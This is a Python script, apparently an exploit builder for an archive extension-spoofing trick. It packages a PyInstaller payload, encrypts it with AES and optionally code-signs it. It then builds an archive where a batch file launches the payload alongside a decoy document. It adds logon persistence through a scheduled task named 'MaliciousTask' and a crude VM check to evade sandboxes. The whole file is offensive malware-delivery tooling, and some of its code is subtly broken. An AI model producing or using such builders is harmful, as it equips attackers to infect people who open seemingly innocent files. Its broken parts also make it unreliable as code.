import os
import random
import string
import zipfile
import shutil
import subprocess
import base64
import sys
import time
import psutil
import pyautogui
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import pycryptodome
import tensorflow
import numpy as np

# Function to create a payload executable with encryption and signing
def generate_payload_exe(encrypt=True, encrypt_key=None, sign=False, cert_path=None, cert_password=None):
    # Create a Python script to serve as the payload
    script_path = 'payload.py'
    with open(script_path, 'w') as f:
        f.write('import os\nos.system("calc.exe")')

    # Generate a PyInstaller spec file for packaging the payload
    spec_path = 'payload.spec'
    with open(spec_path, 'w') as f:
        f.write(f'''
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(['{script_path}'],
             pathex=[],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='payload',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          upx_exclude=[],
          runtime_tmpdir=None,
          console=False,
          icon='icon.ico')
''')

    # Generate the payload executable using PyInstaller
    os.system(f'pyinstaller {spec_path}')

    # Encrypt the payload executable with AES encryption if needed
    if encrypt:
        key = encrypt_key or os.urandom(32)  # Generate random 32-byte AES key
        iv = os.urandom(16)  # Generate random 16-byte initialization vector
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open('dist/payload.exe', 'rb') as f:
            data = f.read()
        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))
        with open('dist/payload.exe', 'wb') as f:
            f.write(encrypted_data)

    # Optionally sign the executable with a digital certificate
    if sign and cert_path and cert_password:
        subprocess.run([f'signcode.exe', f'-spc "{cert_path}"', f'-v "{cert_password}"', f'dist/payload.exe'], check=True)

    # Return the path to the payload executable
    return 'dist/payload.exe'


# Function to create a RAR file containing the payload and decoy document
def generate_rar_file(output_file, input_file, payload_exe, persistence=False, evasion=False):
    # Create a temporary directory to hold files for the RAR package
    temp_dir = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    os.mkdir(temp_dir)

    # Get the name and extension of the decoy document
    decoy_name = os.path.basename(input_file)
    decoy_ext = os.path.splitext(decoy_name)[1]

    # Create directory structure for the decoy and payload
    decoy_dir = os.path.join(temp_dir, f"{decoy_name[:-len(decoy_ext)]}A")
    os.mkdir(decoy_dir)

    # Copy the payload executable into the payload directory
    payload_path = os.path.join(decoy_dir, f"{decoy_name[:-len(decoy_ext)]}A.exe")
    shutil.copyfile(payload_exe, payload_path)

    # Create a batch script that executes both the decoy and payload
    bat_script = f'''
@echo off
start "" "{payload_path}"
start "" "{decoy_name}"
'''
    bat_path = os.path.join(decoy_dir, f"{decoy_name[:-len(decoy_ext)]}A.cmd")
    with open(bat_path, 'w') as f:
        f.write(bat_script)

    # Copy the decoy document into the temporary directory
    decoy_path = os.path.join(temp_dir, f"{decoy_name[:-len(decoy_ext)]}B{decoy_ext}")
    shutil.copyfile(input_file, decoy_path)

    # Create a ZIP file with the payload and decoy document
    zip_path = os.path.join(temp_dir, 'template.zip')
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(decoy_path, f"{decoy_name[:-len(decoy_ext)]}B{decoy_ext}")
        zf.write(bat_path, f"{decoy_name[:-len(decoy_ext)]}A/{decoy_name[:-len(decoy_ext)]}A.cmd")
        zf.write(payload_path, f"{decoy_name[:-len(decoy_ext)]}A/{decoy_name[:-len(decoy_ext)]}A.exe")

    # Read the content of the ZIP file
    with open(zip_path, 'rb') as f:
        content = f.read()

    # Replace the extension of the decoy document with a space
    content = content.replace(decoy_ext.encode(), b' ')

    # Write the content of the ZIP file to the output RAR file
    with open(output_file, 'wb') as f:
        f.write(content)

    # Implement persistence and evasion if specified
    if persistence:
        create_persistence(payload_exe)

    if evasion:
        evade_detection()

    # Clean up the temporary directory
    shutil.rmtree(temp_dir)


def create_persistence(payload_exe):
    """Add persistence mechanism to ensure payload execution after reboot."""
    # Example: Create a scheduled task (Windows Task Scheduler)
    task_name = "MaliciousTask"
    subprocess.run(f'schtasks /create /tn {task_name} /tr {payload_exe} /sc onlogon /f', shell=True)


def evade_detection():
    """Apply basic evasion techniques such as sandbox detection."""
    # Check if running in a virtual machine or sandbox
    if "VMware" in open("/proc/cpuinfo").read():
        sys.exit()  # If VM is detected, terminate the process


# Example usage of the functions
output_file = 'poc.rar'
input_file = 'decoy.pdf'

# Generate the payload executable with encryption and signing
payload_exe = generate_payload_exe(encrypt=True, sign=True, cert_path='cert.pfx', cert_password='password')

# Generate the RAR file containing the decoy and payload
generate_rar_file(output_file, input_file, payload_exe, persistence=True, evasion=True)